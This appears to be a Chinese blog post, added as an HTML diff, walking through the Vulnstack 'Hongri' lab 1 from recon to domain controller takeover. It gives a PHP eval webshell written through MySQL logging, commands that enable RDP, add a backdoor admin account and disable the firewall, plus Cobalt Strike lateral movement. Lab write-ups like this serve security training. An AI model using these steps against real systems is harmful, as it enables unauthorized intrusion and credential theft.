@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>红日靶场1 - 小夏的个人空间</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="icon" type="image/jpeg" href="/img/LOGO.jpg">
+    <script src="../js/lib/highlight.min.js" defer></script>
+</head>
+
+<body>
+    <!-- 导航栏 -->
+    <nav class="navbar" id="navbar">
+        <div class="container">
+            <div class="nav-content">
+                <!-- 桌面端导航 -->
+                <div class="nav-pills desktop-nav">
+                    <a href="/" class="nav-link" data-page="home">主页</a>
+                    <a href="/blog" class="nav-link active" data-page="blog">文章</a>
+                    <a href="/guestbook" class="nav-link" data-page="guestbook">留言</a>
+                    <a href="/about" class="nav-link" data-page="about">关于</a>
+                </div>
+
+                <!-- 右上角控制区 -->
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="theme-toggle" title="切换主题">
+                        <svg class="moon-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" />
+                        </svg>
+                        <svg class="sun-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
+                        </svg>
+                    </button>
+
+                    <!-- 移动端菜单按钮 -->
+                    <button id="mobile-menu-toggle" class="mobile-menu-toggle">
+                        <svg class="hamburger-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M4 6h16M4 12h16M4 18h16" />
+                        </svg>
+                        <svg class="close-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- 移动端菜单 -->
+                <div class="mobile-nav" id="mobile-nav">
+                    <a href="/" class="mobile-nav-link" data-page="home">主页</a>
+                    <a href="/blog" class="mobile-nav-link active" data-page="blog">文章</a>
+                    <a href="/guestbook" class="mobile-nav-link" data-page="guestbook">留言</a>
+                    <a href="/about" class="mobile-nav-link" data-page="about">关于</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- 主内容区 -->
+    <main class="main-content">
+        <div class="container">
+            <div class="article-wrapper">
+                <!-- 左侧目录 -->
+                <aside class="article-toc" id="articleToc">
+                    <!-- 返回按钮 -->
+                    <a href="/blog" class="toc-back-btn">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M19 12H5M12 19l-7-7 7-7" />
+                        </svg>
+                        <span>返回文章列表</span>
+                    </a>
+
+                    <!-- 文章标题 -->
+                    <div class="toc-article-title">红日靶场1</div>
+
+                    <div class="toc-header">
+                        <svg class="toc-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M4 6h16M4 12h16M4 18h7" />
+                        </svg>
+                        <span>文章目录</span>
+                    </div>
+                    <div class="toc-content" id="tocContent"></div>
+                </aside>
+
+                <!-- 文章主体 -->
+                <article class="article">
+                    <!-- 文章头部信息 -->
+                    <div class="article-header">
+                        <div class="article-meta">
+                            <span class="article-category">分类：渗透测试</span>
+                            <span class="article-date">2026 年 3 月 22 日</span>
+                        </div>
+
+                        <h1 class="article-title">红日靶场1</h1>
+
+                        <div class="article-tags">
+                            <span class="article-tag">渗透测试</span>
+                            <span class="article-tag">内网渗透</span>
+                            <span class="article-tag">Cobalt Strike</span>
+                        </div>
+
+                        <div class="article-summary">
+                            红日靶场1渗透测试实战，包含外网信息收集、Web渗透、内网横向移动、域控提权等完整攻击链。
+                        </div>
+                    </div>
+
+                    <!-- 文章内容 -->
+                    <div class="article-content" id="articleContent">
+                        <h2 id="heading-0">下载地址</h2>
+                        <p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener noreferrer">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322151428628.png" alt="红日靶场1">
+                            <figcaption>图注：红日靶场1</figcaption>
+                        </figure>
+                        <p><strong>登录密码</strong>：hongrisec@2019</p>
+
+                        <h2 id="heading-1">环境配置</h2>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>主机</th>
+                                    <th>版本</th>
+                                    <th>内网 IP</th>
+                                    <th>外网 IP</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>WEB</td>
+                                    <td>win7</td>
+                                    <td>192.168.52.143</td>
+                                    <td>192.168.111.129</td>
+                                </tr>
+                                <tr>
+                                    <td>PC</td>
+                                    <td>win03</td>
+                                    <td>192.168.52.141</td>
+                                    <td>无</td>
+                                </tr>
+                                <tr>
+                                    <td>DC</td>
+                                    <td>win08</td>
+                                    <td>192.168.52.138</td>
+                                    <td>无</td>
+                                </tr>
+                            </tbody>
+                        </table>
+
+                        <h2 id="heading-2">网络环境设置</h2>
+                        <p>详细步骤见：<a href="https://taoi.me/article/vulnhub#heading-3" target="_blank" rel="noopener noreferrer">网络环境搭建</a></p>
+                        <p>新建两个网卡</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322163252306.png" alt="新建网卡">
+                            <figcaption>图注：新建网卡</figcaption>
+                        </figure>
+                        <p>为主机添加对应网卡，注意win7要双网卡，两个网段模拟内外网</p>
+                        <p>注意：第一网卡连内网</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322165419433.png" alt="配置网卡">
+                            <figcaption>图注：配置网卡</figcaption>
+                        </figure>
+                        <p>为攻击机添加外网网卡</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322164517427.png" alt="攻击机网卡">
+                            <figcaption>图注：攻击机网卡</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322164727650.png" alt="网络配置">
+                            <figcaption>图注：网络配置</figcaption>
+                        </figure>
+                        <p>开启Web机器的Web服务</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322170428220.png" alt="开启Web服务">
+                            <figcaption>图注：开启Web服务</figcaption>
+                        </figure>
+                        <h3 id="heading-3">拓扑图</h3>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322165717730.png" alt="网络拓扑图">
+                            <figcaption>图注：网络拓扑图</figcaption>
+                        </figure>
+                        <p>设置完毕后VM1、VM2、VM3就在同一内网中了，只有VM1web服务器能够访问内网，所以要想访问win2008和win2003服务器必须要先拿下win7服务器，用它做跳板进内网进行横向渗透。</p>
+
+                        <h2 id="heading-4">外网渗透</h2>
+                        <h3 id="heading-5">信息收集</h3>
+                        <pre><code class="language-bash">nmap 192.168.111.0/24</code></pre>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322171548688.png" alt="nmap扫描">
+                            <figcaption>图注：nmap扫描</figcaption>
+                        </figure>
+                        <p>查看网页</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322172137288.png" alt="网页首页">
+                            <figcaption>图注：网页首页</figcaption>
+                        </figure>
+                        <p>没有发现什么信息，进行目录扫描</p>
+                        <pre><code class="language-bash">dirsearch -u "192.168.111.129"</code></pre>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322172522859.png" alt="目录扫描">
+                            <figcaption>图注：目录扫描</figcaption>
+                        </figure>
+                        <p>发现phpmyadmin，弱口令登录root/root</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322172737893.png" alt="phpMyAdmin登录">
+                            <figcaption>图注：phpMyAdmin登录</figcaption>
+                        </figure>
+                        <p>phpMyAdmin 是广泛使用的 MySQL 管理工具，历史上存在过多个高危漏洞。</p>
+                        <h3 id="heading-6">Get Shell</h3>
+                        <p>查看日志是否开启</p>
+                        <pre><code class="language-sql"> show variables like '%general%';</code></pre>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322173250931.png" alt="查看日志配置">
+                            <figcaption>图注：查看日志配置</figcaption>
+                        </figure>
+                        <p>开启日志，并更改日志路径</p>
+                        <pre><code class="language-sql">set global general_log=on;
+set global general_log_file='C:/phpStudy/WWW/a.php';</code></pre>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322182255278.png" alt="开启日志">
+                            <figcaption>图注：开启日志</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322182331392.png" alt="更改日志路径">
+                            <figcaption>图注：更改日志路径</figcaption>
+                        </figure>
+                        <p>写入一句话木马</p>
+                        <pre><code class="language-sql">select '&lt;?php @eval($_POST[a]);?&gt;'</code></pre>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322182423955.png" alt="写入木马">
+                            <figcaption>图注：写入木马</figcaption>
+                        </figure>
+                        <p>使用蚁剑进行连接</p>
+                        <p>蚁剑的下载安装：后续补上，先欠着</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322183846281.png" alt="蚁剑配置">
+                            <figcaption>图注：蚁剑配置</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322183912703.png" alt="蚁剑连接">
+                            <figcaption>图注：蚁剑连接</figcaption>
+                        </figure>
+                        <p>发现目录中有yxcms</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322184033401.png" alt="发现yxcms">
+                            <figcaption>图注：发现yxcms</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322184101130.png" alt="yxcms配置">
+                            <figcaption>图注：yxcms配置</figcaption>
+                        </figure>
+                        <p>有用户名和密码，登录查看管理后台</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322195615202.png" alt="登录后台">
+                            <figcaption>图注：登录后台</figcaption>
+                        </figure>
+                        <p>在前台模板-&gt;管理模板文件-&gt;index_index.php处可编辑，插入PHP代码</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322200323143.png" alt="编辑模板">
+                            <figcaption>图注：编辑模板</figcaption>
+                        </figure>
+                        <p>插入phpinfo()</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322200356517.png" alt="执行代码">
+                            <figcaption>图注：执行代码</figcaption>
+                        </figure>
+                        <p>执行成功，如果插入一句话木马，也可以getshell</p>
+
+                        <h2 id="heading-7">内网渗透</h2>
+                        <h3 id="heading-8">方法1：远程登录</h3>
+                        <p>尝试使用3389端口远程登录</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322204731016.png" alt="远程登录">
+                            <figcaption>图注：远程登录</figcaption>
+                        </figure>
+                        <p>没有开启，手动开启一下</p>
+                        <p>我们使用以下命令开启它（win7、win2003、winxp），运行后显示3389端口已经成功开启（关闭命令把如下0都换成1）</p>
+                        <pre><code class="language-reg">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322204940541.png" alt="开启3389">
+                            <figcaption>图注：开启3389</figcaption>
+                        </figure>
+                        <p>我们在此创建一个新用户，因为作为攻击者，我们不知道管理员的密码</p>
+                        <pre><code class="language-bash">net user attack ！QAZ2wsx /add 
+net localgroup administrators attack /add 
+net user attack</code></pre>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322210406409.png" alt="创建用户">
+                            <figcaption>图注：创建用户</figcaption>
+                        </figure>
+                        <p>新用户成功提权为管理员</p>
+                        <p>通过msf反弹shell关闭防火墙，然后使用远程桌面连接</p>
+                        <p>msf玩法：先欠着，后续补上</p>
+                        <p>由于我没有关闭了本机远程桌面，暂时不演示</p>
+
+                        <h3 id="heading-9">方法2：Cobalt Strike</h3>
+                        <p>cs的配置：先欠着，以后补上</p>
+                        <h4 id="heading-10">设置监听器</h4>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322213825395.png" alt="设置监听器">
+                            <figcaption>图注：设置监听器</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322220702846.png" alt="监听器配置">
+                            <figcaption>图注：监听器配置</figcaption>
+                        </figure>
+                        <h4 id="heading-11">生成后门木马</h4>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322220750450.png" alt="生成木马">
+                            <figcaption>图注：生成木马</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322214448905.png" alt="木马配置">
+                            <figcaption>图注：木马配置</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322214508033.png" alt="保存木马">
+                            <figcaption>图注：保存木马</figcaption>
+                        </figure>
+                        <p>通过蚁剑上传木马，直接拖入即可</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322214555270.png" alt="上传木马">
+                            <figcaption>图注：上传木马</figcaption>
+                        </figure>
+                        <p>在命令行运行</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322215126873.png" alt="运行木马">
+                            <figcaption>图注：运行木马</figcaption>
+                        </figure>
+                        <p>cs成功上线<figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322220856061.png" alt="上线成功">
+                            <figcaption>图注：上线成功</figcaption>
+                        </figure></p>
+                        <h4 id="heading-12">横向移动</h4>
+                        <p>关闭防火墙</p>
+                        <pre><code class="language-shell">shell netsh advfirewall set allprofile state off</code></pre>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322232841638.png" alt="关闭防火墙">
+                            <figcaption>图注：关闭防火墙</figcaption>
+                        </figure>
+                        <p>端口扫描</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322232928004.png" alt="端口扫描">
+                            <figcaption>图注：端口扫描</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322233356041.png" alt="扫描结果">
+                            <figcaption>图注：扫描结果</figcaption>
+                        </figure>
+                        <p>提权</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322235328925.png" alt="提权">
+                            <figcaption>图注：提权</figcaption>
+                        </figure>
+                        <p>获取密码</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322230726342.png" alt="获取密码">
+                            <figcaption>图注：获取密码</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322235403812.png" alt="密码哈希">
+                            <figcaption>图注：密码哈希</figcaption>
+                        </figure>
+                        <p>获得了system权限</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322235720161.png" alt="system权限">
+                            <figcaption>图注：system权限</figcaption>
+                        </figure>
+                        <p>新建监听器</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260322235129719.png" alt="新建监听器">
+                            <figcaption>图注：新建监听器</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260323000022539.png" alt="监听器配置">
+                            <figcaption>图注：监听器配置</figcaption>
+                        </figure>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260323001007768.png" alt="横向渗透">
+                            <figcaption>图注：横向渗透</figcaption>
+                        </figure>
+                        <p>上线成功</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260323002201419.png" alt="上线成功">
+                            <figcaption>图注：上线成功</figcaption>
+                        </figure>
+                        <p>拿下域控</p>
+                        <figure>
+                            <img src="https://tao-pic.pages.dev/vulnstack1/image-20260323002329202.png" alt="拿下域控">
+                            <figcaption>图注：拿下域控</figcaption>
+                        </figure>
+                        <p>192.168.52.143同理</p>
+
+                        <h2 id="heading-13">总结</h2>
+                        <h3 id="heading-14">渗透流程</h3>
+                        <h4 id="heading-15">环境搭建</h4>
+                        <ol>
+                            <li><strong>网络拓扑</strong>：搭建了模拟真实企业内网环境的靶场
+                                <ul>
+                                    <li>WEB服务器（Win7）：双网卡配置，连接外网和内网</li>
+                                    <li>PC主机（Win2003）：仅内网</li>
+                                    <li>域控（Win2008）：仅内网</li>
+                                </ul>
+                            </li>
+                            <li><strong>攻击策略</strong>：需先拿下作为跳板的Win7 WEB服务器，才能横向渗透内网其他主机</li>
+                        </ol>
+                        <h4 id="heading-16">外网渗透阶段</h4>
+                        <ol>
+                            <li><strong>信息收集</strong>
+                                <ul>
+                                    <li>使用nmap扫描发现目标主机192.168.111.129</li>
+                                    <li>访问网页初步侦察</li>
+                                    <li>使用dirsearch进行目录扫描，发现phpmyadmin</li>
+                                </ul>
+                            </li>
+                            <li><strong>漏洞利用与Get Shell</strong>
+                                <ul>
+                                    <li>利用phpMyAdmin弱口令（root/root）登录</li>
+                                    <li>通过MySQL日志写入一句话木马获取Webshell</li>
+                                    <li>配置蚁剑进行连接和管理</li>
+                                    <li>另外发现了yxcms系统，通过模板编辑功能也可写入恶意代码</li>
+                                </ul>
+                            </li>
+                        </ol>
+                        <h4 id="heading-17">内网渗透阶段</h4>
+                        <p>通过Cobalt Strike进行内网横向移动：</p>
+                        <ol>
+                            <li><strong>建立据点</strong>
+                                <ul>
+                                    <li>在CS中设置监听器</li>
+                                    <li>生成后门木马并通过蚁剑上传</li>
+                                    <li>成功获取Win7主机的权限</li>
+                                </ul>
+                            </li>
+                            <li><strong>横向移动</strong>
+                                <ul>
+                                    <li>关闭防火墙：<code>netsh advfirewall set allprofile state off</code></li>
+                                    <li>进行端口扫描，发现内网其他主机</li>
+                                    <li>提权获取system权限</li>
+                                    <li>获取系统密码凭证</li>
+                                </ul>
+                            </li>
+                            <li><strong>拿下域控</strong>
+                                <ul>
+                                    <li>创建新的监听器用于横向渗透</li>
+                                    <li>利用获取的凭证登录其他内网主机</li>
+                                    <li>成功拿下PC（192.168.52.141）和域控（192.168.52.138）</li>
+                                    <li>获取域控最高权限</li>
+                                </ul>
+                            </li>
+                        </ol>
+                        
+
+                    <!-- 返回顶部按钮 -->
+                    <button id="backToTop" class="back-to-top" title="返回顶部">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M5 10l7-7m0 0l7 7m-7-7v18" />
+                        </svg>
+                    </button>
+                </article>
+            </div>
+        </div>
+    </main>
+
+    <!-- 页脚 -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; <span id="currentYear"></span> 小夏的个人空间</p>
+        </div>
+    </footer>
+
+    <!-- 脚本文件 -->
+    <script src="../js/main.js"></script>
+    <script src="../js/article-toc.js"></script>
+</body>
+
+</html>
